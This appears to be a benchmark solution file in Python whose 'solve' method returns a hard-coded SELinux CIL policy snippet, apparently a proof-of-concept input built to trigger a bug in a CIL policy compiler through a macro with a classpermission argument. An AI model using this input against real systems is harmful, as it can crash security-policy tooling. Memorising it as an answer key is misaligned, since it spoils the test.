import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"(block b(class c(p))(macro m((classpermission x))(classpermissionset s(x)))(call m((c(p)))))\n"
        return poc